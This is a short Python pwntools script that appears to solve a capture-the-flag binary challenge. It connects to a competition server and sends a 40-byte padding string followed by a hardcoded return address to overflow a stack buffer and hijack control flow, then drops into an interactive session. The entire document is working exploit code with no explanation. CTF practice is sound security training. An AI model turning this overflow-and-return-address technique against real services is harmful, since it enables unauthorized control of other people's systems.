
from pwn import * 
context(log_level="debug")

#r = process('./pwn-intended-0x3')
r = remote('chall.csivit.com', 30013)

r.recvuntil('again.\n')

payload = 'A' * 40
payload += p64(0x4011CE)

r.sendline(payload)
r.recvline()
r.interactive()

